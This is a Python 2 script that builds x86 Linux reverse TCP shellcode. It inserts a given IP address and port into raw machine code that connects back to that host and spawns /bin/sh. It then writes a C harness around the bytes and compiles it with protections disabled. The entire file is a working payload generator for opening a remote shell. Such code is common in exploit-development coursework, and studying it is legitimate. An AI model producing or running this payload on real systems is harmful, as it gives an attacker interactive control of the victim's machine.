#!/usr/bin/env python

import sys
import struct
import os
import binascii
import socket

def port2hex(port):
	return struct.pack(">H", port)


def address2hex(address):
	addr = binascii.hexlify(socket.inet_aton(address))
	return binascii.unhexlify("".join([addr[i:i+2] for i in range(0, len(addr), 2)]))
	

if __name__ == "__main__":
	if sys.argv[2] is not None:
		try:
			if (int(sys.argv[2])<1024):
				print "[?] Only root can open ports below 1024"
			
			port = port2hex(int(sys.argv[2]))
			address = address2hex(sys.argv[1])
			port_check = [port.encode('hex')[i:i+2] for i in range(0, len(port.encode('hex')), 2)]
                        address_check = [address.encode('hex')[i:i+2] for i in range(0, len(address.encode('hex')), 2)]
                        nullbytes = False
                        for i in port_check:
                                if (i == "00"):
                                        print "[-] The port contains null bytes, use another port"
                                        nullbytes = True
                        for i in address_check:
                                if (i == "00"):
                                        print "[-] The address contains null bytes."
                                        nullbytes = True
			shellcode = "\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc9\x68%s\x66\x68%s\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x89\xf3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"%(address,port)
			sc = ""
			for c in bytearray(shellcode):
    				sc += "\\x%02x" % c
			shellcode_c = '#include<stdio.h>\n\
#include<string.h>\n\
unsigned char code[] = "%s";\n\
main(){\n\
printf("Shellcode Length: %%d\\n", strlen(code));\n\
int (*ret)() = (int(*)())code;\n\
ret();\n\
}'%sc
			with open("shellcode_tmp.c", "w") as f:
				f.write(shellcode_c)
			os.system("gcc shellcode_tmp.c -fno-stack-protector -z execstack -o shellcode")
			os.system("rm shellcode_tmp.c")
			if nullbytes:
				print "[+] Reverse TCP shellcode created with null bytes\n[+] Run ./shellcode"
			else:
				print "[+] Reverse TCP shellcode created\n[+] Run ./shellcode"
		except ValueError:
			print "[-] Port must be a number"
	else:
		print "usage: %prog <port> \nExample: ./%prog 192.168.1.64 4444"


